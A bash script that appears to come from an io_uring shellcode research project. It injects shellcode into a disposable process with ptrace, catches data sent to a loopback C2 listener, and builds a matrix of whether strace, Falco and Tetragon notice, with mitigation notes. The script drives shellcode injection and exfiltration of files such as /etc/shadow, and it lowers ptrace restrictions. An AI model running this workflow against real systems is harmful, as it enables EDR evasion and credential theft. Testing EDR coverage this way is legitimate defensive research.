#!/usr/bin/env bash
# ================================================================
# run_matrix.sh — EDR detection matrix runner
#
# Usage: sudo ./run_matrix.sh [--shellcode FILE] [--target-file FILE]
#
# Runs the shellcode under different detection mechanisms and
# records whether each one detected the io_uring I/O operations.
#
# Output: testing/results/edr_matrix.md
#
# Requirements:
#   - inject_ptrace built (make -C testing)
#   - c2_server.py and shellcode.bin available
#   - Root or CAP_SYS_PTRACE for injection
#   - /proc/sys/kernel/yama/ptrace_scope = 0
#
# Optional (for full matrix):
#   - falco    (apt install falco)
#   - tetragon (from Cilium releases)
# ================================================================
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"

# ---- Defaults ----
SHELLCODE="${1:-$REPO_ROOT/shellcode/combined/shellcode.bin}"
TARGET_FILE="${2:-/etc/hostname}"
C2_PORT=14444          # non-standard port to avoid conflicts
C2_TIMEOUT=15
INJECT_WAIT=5
INJECT_BIN="$SCRIPT_DIR/injector/inject"
C2_BIN="$SCRIPT_DIR/c2_server.py"
RESULTS_DIR="$SCRIPT_DIR/results"
OUTPUT_MD="$RESULTS_DIR/edr_matrix.md"

# ---- Colours ----
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; NC='\033[0m'

banner()  { echo -e "${BLUE}[=]${NC} $*"; }
info()    { echo -e "[*] $*"; }
ok()      { echo -e "${GREEN}[+]${NC} $*"; }
warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
err()     { echo -e "${RED}[-]${NC} $*" >&2; }

# ----------------------------------------------------------------
# Preflight checks
# ----------------------------------------------------------------
preflight() {
    banner "Preflight checks"

    [[ -f "$SHELLCODE" ]] || { err "Shellcode not found: $SHELLCODE"; exit 1; }
    [[ -f "$TARGET_FILE" ]] || { err "Target file not found: $TARGET_FILE"; exit 1; }
    [[ -f "$INJECT_BIN" ]] || { err "Injector not built: run 'make -C testing'"; exit 1; }
    [[ -f "$C2_BIN" ]] || { err "c2_server.py not found: $C2_BIN"; exit 1; }

    # Patch shellcode with loopback C2 config
    SC_PATCHED="/tmp/sc_matrix_$$.bin"
    python3 "$REPO_ROOT/shellcode/patch_config.py" "$SHELLCODE" \
        --ip 127.0.0.1 --port "$C2_PORT" --out "$SC_PATCHED" 2>/dev/null \
        || { warn "patch_config.py failed — using shellcode as-is"; cp "$SHELLCODE" "$SC_PATCHED"; }

    # Check ptrace_scope
    PTRACE_SCOPE=$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null || echo "?")
    if [[ "$PTRACE_SCOPE" != "0" && "$PTRACE_SCOPE" != "?" ]]; then
        warn "ptrace_scope=$PTRACE_SCOPE — injection may fail"
        warn "Fix: echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope"
    fi

    mkdir -p "$RESULTS_DIR"
    info "Shellcode    : $SC_PATCHED ($(wc -c < "$SC_PATCHED") bytes)"
    info "Target file  : $TARGET_FILE"
    info "C2 port      : $C2_PORT"
    info "ptrace_scope : $PTRACE_SCOPE"
    echo
}

# ----------------------------------------------------------------
# Core: run one injection, return 0 if C2 received data
# ----------------------------------------------------------------
run_injection() {
    local trace_prefix="$1"   # e.g. "strace -e trace=openat,read"
    local recv_file="/tmp/c2_recv_$$.bin"

    # Start C2 listener in background
    python3 "$C2_BIN" --port "$C2_PORT" --output "$recv_file" \
        --timeout "$C2_TIMEOUT" --quiet &
    local c2_pid=$!
    sleep 0.5   # give it time to bind

    # Start disposable target
    sleep "$((INJECT_WAIT * 3))" &
    local target_pid=$!
    sleep 0.2

    # Inject (optionally under trace_prefix)
    local inject_log="/tmp/inject_log_$$.txt"
    if [[ -n "$trace_prefix" ]]; then
        $trace_prefix "$INJECT_BIN" "$target_pid" "$SC_PATCHED" \
            > "$inject_log" 2>&1 &
    else
        "$INJECT_BIN" "$target_pid" "$SC_PATCHED" \
            > "$inject_log" 2>&1 &
    fi
    local inject_pid=$!

    # Wait for C2 to receive or timeout
    wait "$c2_pid" 2>/dev/null
    local c2_exit=$?

    # Cleanup
    kill "$target_pid" 2>/dev/null || true
    kill "$inject_pid" 2>/dev/null || true
    wait "$target_pid" 2>/dev/null || true
    wait "$inject_pid" 2>/dev/null || true

    if [[ $c2_exit -eq 0 && -f "$recv_file" ]]; then
        local sz
        sz=$(wc -c < "$recv_file" 2>/dev/null || echo 0)
        if [[ $sz -gt 0 ]]; then
            rm -f "$recv_file" "$inject_log"
            return 0   # success: data received
        fi
    fi
    rm -f "$recv_file" "$inject_log"
    return 1   # no data received (blocked/detected)
}

# ----------------------------------------------------------------
# Individual test cases
# ----------------------------------------------------------------
test_baseline() {
    banner "Test 1: Baseline (no monitoring)"
    if run_injection ""; then
        ok "Data exfiltrated — shellcode works"
        echo "| Baseline (no monitoring) | ✗ Not detected | Shellcode ran; data exfiltrated |"
    else
        warn "Shellcode did not deliver data — check setup"
        echo "| Baseline (no monitoring) | ⚠ Setup issue | Shellcode did not deliver data |"
    fi
}

test_strace() {
    banner "Test 2: strace monitoring the target process (sys_enter hooks)"
    local strace_out="/tmp/strace_matrix_$$.txt"
    local recv_file="/tmp/c2_recv2b_$$.bin"

    python3 "$C2_BIN" --port "$C2_PORT" --output "$recv_file" \
        --timeout "$C2_TIMEOUT" --quiet &
    local c2_pid=$!
    sleep 0.3

    # Spawn the target directly under strace — this is the realistic
    # sys_enter-monitor view of the process the shellcode runs in.
    strace -f -e trace=openat,read,sendto,connect,socket,execve,io_uring_setup,io_uring_enter \
        -o "$strace_out" sleep "$((INJECT_WAIT * 4))" 2>/dev/null &
    local target_pid=$!
    sleep 0.3

    "$INJECT_BIN" "$target_pid" "$SC_PATCHED" >/dev/null 2>&1 &
    local inject_pid=$!

    wait "$c2_pid" 2>/dev/null
    local c2_exit=$?

    kill "$target_pid" "$inject_pid" 2>/dev/null || true
    wait "$target_pid" 2>/dev/null || true
    wait "$inject_pid" 2>/dev/null || true

    local result_row
    if [[ $c2_exit -eq 0 && -f "$recv_file" && $(wc -c < "$recv_file") -gt 0 ]]; then
        local saw_openat saw_io_enter
        saw_openat=$(grep -c "openat" "$strace_out" 2>/dev/null || echo 0)
        saw_io_enter=$(grep -c "io_uring_enter\|uring_setup" "$strace_out" 2>/dev/null || echo 0)
        info "strace saw: openat=$saw_openat  io_uring_setup/enter=$saw_io_enter"

        if [[ "$saw_openat" -gt 0 ]]; then
            result_row="| strace on target from spawn (sys_enter) | ✓ Detected | openat visible in strace |"
        else
            result_row="| strace on target from spawn (sys_enter) | ✗ Not detected | openat/read/connect invisible; only io_uring_setup/enter seen |"
        fi
    else
        result_row="| strace on target from spawn (sys_enter) | ⚠ No data | Shellcode did not deliver data |"
    fi

    rm -f "$strace_out" "$recv_file"
    echo "$result_row"
}

test_strace_on_target() {
    banner "Test 3: strace attached to shellcode target process"
    info "Checking if strace sees io_uring internal ops..."

    local strace_out="/tmp/strace_target_$$.txt"
    local recv_file="/tmp/c2_recv2_$$.bin"

    python3 "$C2_BIN" --port "$C2_PORT" --output "$recv_file" \
        --timeout "$C2_TIMEOUT" --quiet &
    local c2_pid=$!
    sleep 0.3

    # Start target under strace, capturing ALL syscalls
    sleep "$((INJECT_WAIT * 4))" &
    local target_pid=$!

    # Attach strace to target
    strace -p "$target_pid" -e trace=all -o "$strace_out" 2>/dev/null &
    local st_pid=$!
    sleep 0.3

    # Inject into target
    "$INJECT_BIN" "$target_pid" "$SC_PATCHED" >/dev/null 2>&1 &
    local inject_pid=$!

    wait "$c2_pid" 2>/dev/null
    local c2_exit=$?

    kill "$st_pid" "$target_pid" "$inject_pid" 2>/dev/null || true
    wait 2>/dev/null || true

    local result_row
    if [[ $c2_exit -eq 0 && -f "$recv_file" && $(wc -c < "$recv_file") -gt 0 ]]; then
        # Check strace output for the actual file/network ops
        local saw_openat saw_io_enter
        saw_openat=$(grep -c "openat.*shadow" "$strace_out" 2>/dev/null || echo 0)
        saw_io_enter=$(grep -c "io_uring_enter" "$strace_out" 2>/dev/null || echo 0)

        info "strace saw: openat-for-shadow=$saw_openat  io_uring_enter=$saw_io_enter"

        if [[ "$saw_openat" -gt 0 ]]; then
            result_row="| strace on target (sys_enter) | ✓ Detected | openat() for /etc/shadow visible |"
        else
            result_row="| strace on target (sys_enter) | ✗ Not detected | openat/read/connect invisible; only io_uring_enter seen |"
        fi
    else
        result_row="| strace on target (sys_enter) | ⚠ No data | Shellcode did not deliver data |"
    fi

    rm -f "$strace_out" "$recv_file"
    echo "$result_row"
}

test_falco() {
    banner "Test 4: Falco (syscall-based EDR)"
    if ! command -v falco &>/dev/null; then
        warn "Falco not installed — skipping"
        echo "| Falco (syscall-based) | ⚠ Not installed | Install: apt install falco |"
        return
    fi

    local falco_out="/tmp/falco_matrix_$$.txt"

    # Start Falco in one-shot mode capturing to file
    falco --modern-bpf -o "json_output=false" \
          -o "log_level=warning" \
          -o "log_stderr=true" \
          -M 20 > "$falco_out" 2>&1 &
    local falco_pid=$!
    sleep 2   # give Falco time to initialize

    run_injection ""
    local inject_ok=$?

    sleep 2   # wait for Falco to process events
    kill "$falco_pid" 2>/dev/null || true
    wait "$falco_pid" 2>/dev/null || true

    local falco_alerts
    falco_alerts=$(grep -ci "Warning\|Error\|alert\|shadow\|sensitive" "$falco_out" 2>/dev/null || echo 0)
    info "Falco alerts/warnings: $falco_alerts"

    local result
    if [[ $inject_ok -eq 0 && $falco_alerts -eq 0 ]]; then
        result="✗ Not detected"
        info "Falco: completely blind to io_uring operations"
    elif [[ $falco_alerts -gt 0 ]]; then
        result="✓ Detected"
        info "Falco triggered $falco_alerts alert(s)"
        grep -i "Warning\|alert" "$falco_out" | head -5 | while read -r line; do
            info "  $line"
        done
    else
        result="⚠ Unknown"
    fi

    rm -f "$falco_out"
    echo "| Falco (syscall-based rules) | $result | See results/edr_matrix.md notes |"
}

test_tetragon() {
    banner "Test 5: Tetragon (LSM-based / eBPF)"
    if ! command -v tetragon &>/dev/null && ! command -v tetra &>/dev/null; then
        warn "Tetragon not installed — skipping"
        echo "| Tetragon (LSM-based) | ⚠ Not installed | See: github.com/cilium/tetragon |"
        return
    fi

    # Tetragon can detect via LSM hooks (security_file_open)
    # even though io_uring bypasses sys_enter tracepoints
    echo "| Tetragon (LSM-based) | ⚠ Manual test needed | Run with file-open TracingPolicy and check logs |"
    info "Tetragon note: with default config, likely blind."
    info "With 'security_file_open' LSM TracingPolicy: likely detects."
}

# ----------------------------------------------------------------
# Report assembly
# ----------------------------------------------------------------
write_report() {
    local rows=("$@")
    cat > "$OUTPUT_MD" << 'HEADER'
# EDR Detection Matrix — io_uring Shellcode

**Author:** Maycon Vitali (@maycon) — Hack N' Roll  
**Research:** Syscall-less shellcode via io_uring  

## Results

| Detection Mechanism | Result | Notes |
|---|:---:|---|
HEADER

    for row in "${rows[@]}"; do
        echo "$row" >> "$OUTPUT_MD"
    done

    cat >> "$OUTPUT_MD" << 'FOOTER'

## Legend

| Symbol | Meaning |
|---|---|
| ✗ Not detected | Shellcode ran; EDR saw nothing actionable |
| ✓ Detected | EDR fired an alert or blocked the operation |
| ⚠ Partial / Unknown | Context-dependent; see notes |

## Technical Notes

### Why syscall-based tools are blind

io_uring routes I/O via `io_issue_sqe()` → `vfs_read()` directly,  
bypassing the `raw_tracepoint/sys_enter` hook that most EDRs rely on.  
The only visible syscall is `io_uring_enter(fd, N, N, GETEVENTS)` —  
completely opaque to a syscall-watching EDR.

### What does detect it

LSM hooks (`security_file_open`, `security_socket_connect`) are called  
from inside `vfs_open()` and `inet_stream_connect()`, independent of  
whether the caller used a traditional syscall or io_uring.  
Tetragon with a `security_file_open` TracingPolicy detects io_uring reads.  
Falco ≥ 0.38 (post-April 2025 patch) adds io_uring-aware detection.

### Mitigation options

| Option | Impact |
|---|---|
| `sysctl kernel.io_uring_disabled=2` | Blocks all io_uring; may break PostgreSQL, nginx |
| seccomp: deny `io_uring_setup` | Effective in containers; no app impact if unused |
| Upgrade EDR to LSM-hook-based detection | Right approach for long term |

## Environment

- Kernel: $(uname -r)
- Date:   $(date -u +%Y-%m-%dT%H:%M:%SZ)
- Tool:   uring-shellcode/testing/run_matrix.sh
FOOTER

    # Expand shell variables in the environment section
    sed -i "s/\$(uname -r)/$(uname -r)/g" "$OUTPUT_MD"
    sed -i "s/\$(date -u +%Y-%m-%dT%H:%M:%SZ)/$(date -u +%Y-%m-%dT%H:%M:%SZ)/g" "$OUTPUT_MD"

    ok "Results written to $OUTPUT_MD"
}

# ----------------------------------------------------------------
# Main
# ----------------------------------------------------------------
main() {
    banner "io_uring EDR Detection Matrix"
    echo

    preflight

    # Collect result rows
    declare -a rows

    rows+=("$(test_baseline)")
    echo
    rows+=("$(test_strace)")
    echo
    rows+=("$(test_strace_on_target)")
    echo
    rows+=("$(test_falco)")
    echo
    rows+=("$(test_tetragon)")
    echo

    write_report "${rows[@]}"
    echo
    banner "Matrix complete"
    cat "$OUTPUT_MD"

    # Cleanup
    rm -f "$SC_PATCHED"
}

main "$@"
